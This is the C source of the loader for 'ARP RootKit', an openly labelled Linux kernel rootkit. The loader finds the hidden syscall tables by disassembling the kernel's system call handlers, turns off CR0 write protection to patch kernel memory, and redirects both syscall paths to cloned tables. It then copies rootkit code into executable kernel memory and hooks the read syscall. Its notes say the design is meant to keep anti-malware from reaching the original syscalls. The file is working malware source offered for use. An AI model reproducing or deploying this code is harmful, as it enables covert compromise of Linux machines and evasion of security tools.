/***
 *      _  __  __     __                       
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_ 
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_  
 *                                             
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
 * For that, it uses PIC & PIE compilation flags of kernel.c.
 *
 * To hook the syscalls, it needs to find some unexported symbols:
 *  - sys_call_table
 *  - __vmalloc_node_range
 *
 * The code in kernel.c is compiled in the module in the .data section.
 * So we only need to use set_memory_x to test it from inside the LKM (and also to use some functions inside kernel.c).
 * But maybe we can use __vmalloc_node_range() and PAGE_KERNEL_EXEC, to avoid
 * the use of set_memory_x, as we know it's working (because at the beggining of dev I didn't know if the code was working even in the LKM context).
 *
 * set_memory_rw() and "_ro() are implemented by searching change_page_attr_set_clr(),
 * inside set_memory_x() (which is exported, at least in v4.13).
 * But as we couldn't replace the holders of the sys_call_table, to point our own table, I did research.
 * And I found that disabling the 16th bit from CR0, we can write even if it's write-protected =).
 *
 * Atm, the <>_fastpath label on the SYSCALL handler is not used. But it's located and hooked.
 * <>_slowpath is used, and could be also hooked.
 *
 * The interrupt 0x80 is still alive in x86_64, but only on for compatibility.
 * So, to prevent an anti-malware to use the original syscalls in the ia32_sys_call_table, that table is also
 * cloned and hooked.
 *
 * 24/01/2018 - D1W0U
 *
 * I modified the source to give support to the current available kernels in Ubuntu Xenial. And it's working for them all atm.
 * Maybe in the future there's some new one, and still the rootkit doesn't support it.
 * The ugly part of this project is to find the addresses where the sys_call_table is located. To execute syscalls.
 * But also maybe some symbols becomes unexported in a future version, and that makes me to go mad in finding new ways... who knows!
 * Now I'm going to implement the cloning and replacement of ia32_sct, and later I can start with the rootkit itself :)
 *
 * set_memory_rw and ro are commented as they're not used. But as it was work done, and maybe you find them useful, I'm leaving the code commented.
 *
 * Some commented code won't work in all kernel versions, and I had to remove some headers they're not in 4.8 nor 4.4. Also I had to reimplement __rdmsr() to my_rdmsr().
 * As well as some other functions starting by my_, because not existent in older versions of the Linux Kernel. But everything seems ok in the specified versions in README.md notes.
 *
 * 28/01/2018 - D1W0U
 */

#include <linux/vmalloc.h>
#include <asm/desc.h>
#include <linux/net.h>
#include <linux/file.h>
#include <asm/msr.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */
#include <linux/version.h> /* For LINUX_VERSION_CODE */
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <capstone.h>

/*
 * Macros
 */
#define PAGE_ROUND_DOWN(x) (((unsigned long)(x)) & (~(PAGE_SIZE-1)))
#define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))
#define CPA_ARRAY 2
#ifdef CONFIG_X86_64
/* Using 64-bit values saves one instruction clearing the high half of low */
#define DECLARE_ARGS(val, low, high)    unsigned long low, high
#define EAX_EDX_VAL(val, low, high) ((low) | (high) << 32)
#define EAX_EDX_RET(val, low, high) "=a" (low), "=d" (high)
#else
#define DECLARE_ARGS(val, low, high)    unsigned long long val
#define EAX_EDX_VAL(val, low, high) (val)
#define EAX_EDX_RET(val, low, high) "=A" (val)
#endif
//#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
//#define sleep(var)
#define sleep(var) pinfo("Press ENTER to continue..."); KSYSCALL(__NR_read, 0, &var, 1, 0, 0, 0)
#define MY_PAGE_KERNEL_NOENC (__pgprot(__PAGE_KERNEL))
#define MY_PAGE_KERNEL_EXEC_NOENC (__pgprot(__PAGE_KERNEL_EXEC))

/*
 * Kernel shared definitions: labels, variables and functions.
 */
#include "kernel.h"
#include "hooks.h"

/*
 * Loader declarations.
 */
//void *readfile(const char *file, size_t *len);
int disassemble(void *code, size_t code_len);
/*
 * this function takes the value of the address implied in the <inst> specified instruction, and also takes the address where the address is.
 */
void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
/*
 * that does the same than before but searching for a specified opstr (which is the operand of a instruction in asm).
 */
void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr);
/*
 * and the following one, the same, but the op addr must be in a range. Used for call/jmp, you can take the Nth instruction with a jump longitude specified.
 */
void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr);
void *search_sct_fastpath(unsigned int **psct_addr);
void *search_sct_slowpath(unsigned int **psct_addr);
void *search_ia32sct_int80h(unsigned int **psct_addr);

void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
void hook_kernel_funcs(void);
//int set_memory_rw(unsigned long addr, int pages);
//int set_memory_ro(unsigned long addr, int pages);
//void *search_change_page_attr_set_clr(void *set_memory);
void *search___vmalloc_node_range(void *__vmalloc);
inline unsigned long my_gate_offset(const gate_desc *g);
extern int set_memory_x(unsigned long addr, int numpages);
inline unsigned long long notrace my_rdmsr(unsigned int msr);
int safe_zero(void *dst, size_t len);
int clone_sct(void *dst, void *src, size_t len);
int sct_len(void *src, size_t *out_len);
void install_hooks(void);
void uninstall_hooks(void);
void rseed(long);
long rand64(void);
inline int rand32(void);
mm_segment_t *search_addr_limit(void);

/*
 * Global variables.
 */
void (*f_kernel_test)(void) = NULL;
//int (*f_change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages) = NULL;
void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, unsigned long vm_flags, int node,
            const void *caller) = NULL;
long module_load_offset = 0;

/*
 * those clears/sets the WP bit from CR0, to be able to disable the memory write protection.
 */
void disable_wp(void);
void enable_wp(void);

int load(void)
{
	size_t my_sct_len = 0, my_sct_pagelen = 0;
	void *tmp = NULL;
	long addr = 0;
	int ret = 0;

	addr_limit = search_addr_limit();
	if (addr_limit == NULL) {
		return -2;
	}

    kernel_len = &kernel_end - &kernel_start;
    kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
    kernel_pages = kernel_paglen >> PAGE_SHIFT;

    /*
     * Make our kernel executable, to can use pinfo(), perr().
     */
    set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);

	/*
	 * Load Linux Kernel exported symbols for our rootkit.
	 */
    f_kmalloc = kmalloc;
    f_kfree = kfree;
    f_find_vpid = find_vpid;
    f_vscnprintf = vscnprintf;
	f_printk = printk;
	f_sockfd_lookup = sockfd_lookup;
	f_strncmp = strncmp;
	f_probe_kernel_write = probe_kernel_write;
	f_fget = fget;
	f_fput = fput;
	f_sock_from_file = sock_from_file;
	f_strlen = strlen;
	f_kstrtoull = kstrtoull;
	f_memcpy = memcpy;

	kernel_tree = get_kernel_tree();

	if (my_get_fs().seg != 0x7ffffffff000) {
		// TODO: maybe to bruteforce the addr_limit address.
		return -2;
	}

	printk("kernel_tree = %d\n", kernel_tree);
	printk("get_fs = %p\n", my_get_fs().seg);
	//return -1;

	/*
     * uncomment this to be able to print into stdout/stderr with pinfo() and perr() functions, in dev mode.
	 * the rootkit shouldn't use kallsyms_lookup_name in "production" kernels, I mean, it doesn't have to depend from finding symbols with this API because it's not always present.
	 * Symbols from kallsyms not are always available. It's a configuration flag in kernel.
	 */
	f_sys_write = kallsyms_lookup_name("sys_write");

	/*
	 * Search sys_call_table[] address.
	 */
	tmp = search_sct_fastpath(&psct_fastpath);
	if (tmp == NULL) {
		return -2;
	}
	if (search_sct_slowpath(&psct_slowpath) != tmp) {
		return -2;
	}
	sys_call_table = tmp;
    ia32_sys_call_table = search_ia32sct_int80h(&pia32sct);

	pinfo("Hurra! sys_call_table = %p, fastpath_location = %p, slowpath_location = %p, ia32_sys_call_table = %p, pia32sct = %p\n", sys_call_table, psct_fastpath, psct_slowpath,
	ia32_sys_call_table, pia32sct);

	/*
	 * Search not exported symbols.
	 */
	/*
	f_change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
	if (f_change_page_attr_set_clr != NULL) {
		pinfo("Hurra! change_page_attr_set_clr() = %p\n", f_change_page_attr_set_clr);
	} else {
		perr("Sorry, can't find change_page_attr_set_clr().\n");
		return 0;
	}
	*/
	f__vmalloc_node_range = search___vmalloc_node_range(__vmalloc);
	if (f__vmalloc_node_range != NULL) {
		pinfo("Hurra! __vmalloc_node_range() = %p\n", f__vmalloc_node_range);
	} else {
		perr("Sorry, can't find __vmalloc_node_range().\n");
		return -2;
	}

	/*
	 * Reserve & clone a new (our) sys_call_table.
	 */
	ret = sct_len(sys_call_table, &my_sct_len);
	if (ret != 0) {
		perr("Sorry, sct_len(sys_call_table) ret = %d.\n", ret);
		return -2;
	}
	pinfo("sys_call_table len = %d\n", my_sct_len);

	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
	rseed(get_seconds());
	module_load_offset = (rand32() % 1024 + 1) * PAGE_SIZE;
	pinfo("module_load_offset = %x, addr would be = %p\n", module_load_offset, MODULES_VADDR + module_load_offset);
	my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
	//my_sct = vmalloc(my_sct_pagelen);
	if (my_sct == NULL) {
		perr("Sorry, can't reserve memory with __vmalloc_node_range() for my_sct.\n");
		return -2;
	}
	pinfo("reserved %d bytes at %p\n", my_sct_pagelen, my_sct);

	// zero memory
	ret = safe_zero(my_sct, my_sct_pagelen);
	if (ret != 0) {
		perr("Sorry, can't zero memory of my_sct.\n");
		return -2;
	}
	pinfo("my_sct zeroed!\n");

	//sleep(ret);

	ret = clone_sct(my_sct, sys_call_table, my_sct_len);
	if (ret != 0) {
		perr("Sorry, can't clone sys_call_table.\n");
		return -2;
	}
	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);

	//sleep(ret);

	/*
	 * Clone the ia32 sct.
	 */
	ret = sct_len(ia32_sys_call_table, &my_sct_len);
	if (ret != 0) {
		perr("Sorry, sct_len(ia32_sct) ret = %d.\n", ret);
		// TODO: free memory.
		return -2;
	}
	pinfo("ia32_sct len = %d\n", my_sct_len);

	//sleep(ret);

	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
	// TODO: add KASLR offset in start address.
    my_ia32sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
    if (my_ia32sct == NULL) {
        perr("Sorry, can't reserve memory for my_ia32sct.\n");
        return -2;
    }
	pinfo("reserved %d bytes at %p.\n", my_sct_pagelen, my_ia32sct);

	//sleep(ret);

    // zero memory
    ret = safe_zero(my_ia32sct, my_sct_pagelen);
    if (ret != 0) {
        perr("Sorry, can't zero memory for our sct.\n");
        return -2;
    }
    pinfo("my_ia32sct zeroed!\n");	

	//sleep(ret);

	ret = clone_sct(my_ia32sct, ia32_sys_call_table, my_sct_len);
	if (ret != 0) {
		perr("Sorry, clone_sct(my_ia32sct) ret = %d.\n", ret);
		// TODO: free memory
		return -2;
	}
	pinfo("ia32_sct cloned at = %p\n", my_ia32sct);

	//sleep(ret);

    /*
     * Install the new SCTs into SYSCALL handler, and int 0x80 handler.
     */
    pinfo("before psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);
    addr = (int) my_sct;
    disable_wp();
    ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
    ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
	addr = (int) my_ia32sct;
	ret = probe_kernel_write(pia32sct, &addr, sizeof(int));
    enable_wp();
    if (ret != 0) {
        perr("Sorry, error while replacing sys_call_table on SYSCALL handler.\n");
        return -2;
    }
    pinfo("after psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);

    //sleep(ret);

	/*
     * Insert out rootkit into memory.
	 */
	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
	kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, MY_PAGE_KERNEL_EXEC_NOENC, 0, NUMA_NO_NODE, __builtin_return_address(0));
	if (kernel_addr != NULL) {
		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
		/*
		 * Make our rootkit code executable.
		 */
		//ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
		//pinfo("ret = %d\n", ret);
		//pinfo("kernel_addr's pages are now executable.\n");
		
		ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
		if (ret != 0) {
			perr("Sorry, can't copy kernel to its place.\n");
			return -2;
		}
		//memcpy(kernel_addr, &kernel_start, kernel_len);
		//pinfo("kernel is now copied to kernel_addr.\n");
		
		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));

		kernel_test();

		//pinfo("kernel_test execution from LKM successful.\n");

		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
		//pinfo("f_kernel_test at %p\n", f_kernel_test);
		f_kernel_test();
		pinfo("f_kernel_test execution from allocated code, successful.\n");

		//hook_kernel_funcs();

		//pinfo("ARPRootKit successfully installed!\n");

		// uncomment for testing:
		//(*f_kfree())(kernel_addr);

		install_hooks();
		sleep(ret);
		uninstall_hooks();
	} else {
		perr("can not allocate memory.\n");
		return -2;
	}

    return -1;
}

void install_hooks(void) {
    //HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
	HOOK64(__NR_read, KADDR(my_read64));
	//pinfo("my_read64 at %p\n", KADDR(my_read64));
	pinfo("Hooks installed!\n");
}

void uninstall_hooks(void) {
	UNHOOK64(__NR_read);
	pinfo("Hooks uninstalled!\n");
}

int safe_zero(void *dst, size_t len) {
	char zero = 0;
	size_t i = 0;
	int ret = 0;
	char *cdst = dst;

	for(; i < len; i++) {
		//pinfo("writing %d byte(s) at %p\r", sizeof(zero), &cdst[i]);
        ret = probe_kernel_write(&cdst[i], &zero, sizeof(zero));
        if (ret != 0) {
            return ret;
        }
    }
	//pinfo("\n");

	return 0;
}

int clone_sct(void *dst, void *src, size_t len) {
	size_t i = 0;
	int ret = 0;
	long *ldst = dst, *lsrc = src, addr;

	for (; i < len; i++) {
        ret = probe_kernel_read(&addr, &lsrc[i], sizeof(addr));
        if (ret != 0) {
            perr("Sorry, probe_kernel_reat() ret = %d, on %s().", ret, __func__);
            return ret;
        }

        ret = probe_kernel_write(&ldst[i], &addr, sizeof(addr));
        if (ret != 0) {
            perr("Sorry, probe_kernel_write() ret = %d on %s().", ret, __func__);
            return ret;
        }
    }

	return 0;
}

int sct_len(void *src, size_t *out_len) {
	long addr = 0;
	size_t i = 0;
	int ret = 0;
	long *lsrc = src;

    for (addr = 0, i = 0, *out_len = 0; 1; i++) {
        ret = probe_kernel_read(&addr, &lsrc[i], sizeof(addr));
        if (ret != 0) {
            perr("Sorry, probe_kernel_read() ret = %d in %().", ret, __func__);
            return ret;
        }

        if (addr == 0) { // NULL entry, we get in the end.
            break;
        }

       *out_len += 1;
    }

	return 0;
}

// from http://vulnfactory.org/blog/2011/08/12/wp-safe-or-not/
void disable_wp(void) {
    asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
}

void enable_wp(void) {
    asm("cli\n\tmov\t%cr0, %rax\n\tor\t$0x10000, %rax\n\tmov\t%rax, %cr0\n\tsti");
}

void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr) {
    csh handle;
    cs_insn *insn;
    void *addr_found = NULL;
    size_t count, j, code_len, dist;
    int pos_count = 0;

#ifdef DISASS_DBG
	size_t i;
#endif

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        perr("cs_open() error\n");
        return NULL;
    }

    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

    for (code_len = 15; 1; code_len += 15) {
        count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
#ifdef DISASS_DBG
        pinfo("%d instructions disassembled.\n", count);
#endif
        if (count > 0) {
            for (j = 0; j < count; j++) {
#ifdef DISASS_DBG
                pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
                for (i = 0; i < insn[j].size; i++) {
                    pinfo("%02x ", insn[j].bytes[i]);
                }
                pinfo("\n");
#endif
                if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
					sscanf(insn[j].op_str, fmt, &addr_found);
					if (addr_found != NULL) {
						dist = (unsigned long)addr_found - insn[j].address;
#ifdef DISASS_DBG
						pinfo("DIST = %lx\n", dist);
#endif
						if ((dist >= from && dist <= to) || ((dist * -1) >= from && (dist * -1) <= to)) {
							pos_count ++;
		                    if (pos_count == position) {
                        		pinfo("%s found! addr = %p\n", inst, addr_found);
		                        *loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
        		                cs_free(insn, count);
                		        cs_close(&handle);
								return addr_found;
							}
						}
                    }
                }
            }
            cs_free(insn, count);
			pos_count = 0;
			addr_found = NULL;
        } else {
            pinfo("ERROR: Failed to disassemble given code!\n");
            cs_close(&handle);
            return NULL;
        }
        if (code_len >= max) {
            break;
        }
    }

    cs_close(&handle);

    return NULL;
}

void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, void **loc_addr) {
    csh handle;
    cs_insn *insn;
	void *addr_found = NULL;
    size_t count;
    size_t j;
	size_t code_len;
	int pos_count = 0;
#ifdef DISASS_DBG
	size_t i = 0;
#endif

	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        perr("cs_open() error\n");
        return NULL;
    }

    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

	for (code_len = 15; 1; code_len += 15) {
	    count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
#ifdef DISASS_DBG
	    pinfo("%d instructions disassembled.\n", count);
#endif
	    if (count > 0) {
	        for (j = 0; j < count; j++) {
#ifdef DISASS_DBG
	            pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
	            for (i = 0; i < insn[j].size; i++) {
        	        pinfo("%02x ", insn[j].bytes[i]);
				}
            	pinfo("\n");
#endif
                if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
                    pos_count ++;
                    if (pos_count == position) {
						sscanf(insn[j].op_str, fmt, &addr_found);
                        //int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
                        //pinfo("r %d %p\n", r, addr_found);
                        pinfo("%s found! addr = %p\n", inst, addr_found);
						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
                        cs_free(insn, count);
                        cs_close(&handle);
                        return addr_found;
                    }
                }
        	}
        	cs_free(insn, count);
			pos_count = 0;
	    } else {
    	    pinfo("ERROR: Failed to disassemble given code!\n");
	        cs_close(&handle);
	        return NULL;
	    }
		if (code_len >= max) {
			break;
		}
	}

    cs_close(&handle);

    return NULL;
}

void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr) {
    csh handle;
    cs_insn *insn;
    void *addr_found = NULL;
    size_t count;
    size_t j;
    size_t code_len;
    int pos_count = 0;
#ifdef DISASS_DBG
	size_t i;
#endif

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        perr("cs_open() error\n");
        return NULL;
    }

    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

    for (code_len = 15; 1; code_len += 15) {
        count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
#ifdef DISASS_DBG
        pinfo("%d instructions disassembled.\n", count);
#endif
        if (count > 0) {
            for (j = 0; j < count; j++) {
#ifdef DISASS_DBG
                pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
                for (i = 0; i < insn[j].size; i++) {
                    pinfo("%02x ", insn[j].bytes[i]);
                }
                pinfo("\n");
#endif
                if (strlen(insn[j].op_str) >= strlen(opstr) && memmem(insn[j].op_str, strlen(insn[j].op_str), opstr, strlen(opstr)) != NULL) {
                    pos_count ++;
                    if (pos_count == position) {
                        sscanf(insn[j].op_str, fmt, &addr_found);
                        //int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
                        //pinfo("r %d %p\n", r, addr_found);
                        pinfo("%s found! addr = %p\n", opstr, addr_found);
                        *loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
                        cs_free(insn, count);
                        cs_close(&handle);
                        return addr_found;
                    }
                }
            }
            cs_free(insn, count);
			pos_count = 0;
        } else {
            pinfo("ERROR: Failed to disassemble given code!\n");
            cs_close(&handle);
            return NULL;
        }
        if (code_len >= max) {
            break;
        }
    }

    cs_close(&handle);

    return NULL;
}

/*	
void *search_change_page_attr_set_clr(void *set_memory) {
	void *tmp;
	void *addr = disass_search_inst_addr(set_memory, "call", "%lx", 0x100, 1, &tmp);
	return addr;
}
*/

void *search___vmalloc_node_range(void *__vmalloc) {
	void *tmp;
	void *addr = disass_search_inst_addr(__vmalloc, "call", "%lx", 0x100, 1, &tmp);
	return addr;
}

/*
static inline int f_change_page_attr_set(unsigned long *addr, int numpages,
                       pgprot_t mask, int array)
{
    return f_change_page_attr_set_clr(addr, numpages, mask, __pgprot(0), 0,
        (array ? CPA_ARRAY : 0), NULL);
}

static inline int f_change_page_attr_clear(unsigned long *addr, int numpages,
                     pgprot_t mask, int array)
{
    return f_change_page_attr_set_clr(addr, numpages, __pgprot(0), mask, 0,
        (array ? CPA_ARRAY : 0), NULL);
}

int set_memory_rw(unsigned long addr, int numpages) {
	return f_change_page_attr_set(&addr, numpages, __pgprot(_PAGE_RW), 0);
}

int set_memory_ro(unsigned long addr, int numpages) {
	return f_change_page_attr_clear(&addr, numpages, __pgprot(_PAGE_RW), 0);
}
*/

void hook_kernel_funcs(void) {
	disassemble(sock_recvmsg, 0x20);
}

int disassemble(void *code, size_t code_len) {
	csh handle;
	cs_insn *insn;
	size_t count;
	size_t j, i;
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
		perr("cs_open() error\n");
		return -1;
	}

	cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax

	count = cs_disasm(handle, code, code_len, (unsigned long)code, 0, &insn);
	pinfo("%d instructions disassembled.\n", count);
	if (count > 0) {
		for (j = 0; j < count; j++) {
			pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
			for (i = 0; i< insn[j].size; i++) {
				pinfo("%02x ", insn[j].bytes[i]);
			}
			pinfo("\n");
		}
		cs_free(insn, count);
	} else {
		pinfo("ERROR: Failed to disassemble given code!\n");
		cs_close(&handle);
		return -1;
	}
	cs_close(&handle);

	return 0;
}

void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len) {
    while (hs_len >= n_len) {
        hs_len--;
        if (!memcmp(haystack, needle, n_len))
            return (void *)haystack;
        haystack++;
    }
    return NULL;
}

static inline void my_store_idt(struct desc_ptr *dtr) {
    asm volatile("sidt %0":"=m" (*dtr));
}

void *search_ia32sct_int80h(unsigned int **psct_addr) {
	void *ia32sct = NULL;
    struct desc_ptr idtr;
    gate_desc *idt = NULL;

    my_store_idt(&idtr);
    pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
    idt = (gate_desc *) idtr.address;
    ia32sct = (void *) (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
    pinfo("int 0x80 handler address = %p\n", ia32sct);
	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
	ia32sct = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x6f0000, 0xa10000, (void **)psct_addr);
	if (ia32sct != NULL) {
		ia32sct = disass_search_inst_addr(ia32sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
		if (ia32sct != NULL) {
			ia32sct = (void *)((long) ia32sct * -1);
			return ia32sct;
		}
	}

	return NULL;
}

void *search_sct_fastpath(unsigned int **psct_addr) {
	void *sct = (void *) my_rdmsr(MSR_LSTAR);
	void *tmp = NULL;
	// DO NOT call disassemble() in this function as sys_write is not yet imported!
	// or import sys_write into f_sys_write before calling:
	//*f_sys_write() = kallsyms_lookup_name("sys_write");
	//disassemble(sct, 0x100);
	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
		sct = tmp;
		sct += 3;
		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
	} else {
		pinfo("kernel version might be <= 4.11 on (search_sct_fastpath()).\n");
	}

	//disassemble(sct, 0x200);
	tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 1, (void **)psct_addr); // search for a direct call with offset
	if (tmp == NULL) {
		tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "-%x", 0x200, 1, (void **)psct_addr); // search for a mov with offset
	}
	if (tmp != NULL) {
		sct = tmp;
		sct = (void *) ((long) sct * -1);
		return sct;
	} else{
		// can't write without sys_write() :(
		perr("Sorry! call not found when searching sct in fastpath.\n");
	}

	return NULL;
}

// v4.13.0-31: 2nd call to distance >= 0x6f0000 <= 0xa10000
// in v4.4.101 the do_syscall_64 isn't exist. So, we search for another sys_call_table taken from search_sct_fastpath(), inside SYSCALL entry.
void *search_sct_slowpath(unsigned int **psct_addr) {
	void *sct = (void *) my_rdmsr(MSR_LSTAR);
	void *tmp = NULL;
	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
		sct = tmp;
		sct += 3;
		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
	} else {
		pinfo("kernel version might be <= 4.11 on (search_sct_slowpath()).\n");
	}
	tmp = disass_search_inst_range_addr(sct, "call", "%lx", 0x300, 2, 0x6f0000, 0xa10000, (void **)psct_addr);
	if (tmp != NULL) {
		sct = tmp;
		pinfo("do_syscall_64 maybe at %p\n", sct);
		tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
		if (tmp != NULL) {
			sct = tmp;
			sct = (void *)((long) sct * -1);
			return sct;
		} else {
			sct = (void *) my_rdmsr(MSR_LSTAR);
	        tmp = disass_search_opstr_addr(sct, "(, %rax, 8)", "*-%x", 0x200, 2, (void **)psct_addr); // search for a direct call with offset
	        if (tmp != NULL) {
	            sct = tmp;
	            sct = (void *)((long) sct * -1);
	            return sct;
	        } else {
				perr("Sorry, can't locate call with sys_call_table.\n");
			}
		}
	} else {
		perr("Sorry, can't locate do_syscall_64.\n");
	}
	return NULL;
}

inline unsigned long my_gate_offset(const gate_desc *g)
{
#ifdef CONFIG_X86_64
    return g->offset_low | ((unsigned long)g->offset_middle << 16) |
        ((unsigned long) g->offset_high << 32);
#else
    return g->offset_low | ((unsigned long)g->offset_middle << 16);
#endif
}

inline unsigned long long notrace my_rdmsr(unsigned int msr)
{
    DECLARE_ARGS(val, low, high);

    asm("rdmsr" : EAX_EDX_RET(val, low, high) : "c" (msr));

    return EAX_EDX_VAL(val, low, high);
}

// from https://stackoverflow.com/questions/15038174/generate-random-numbers-without-using-any-external-functions
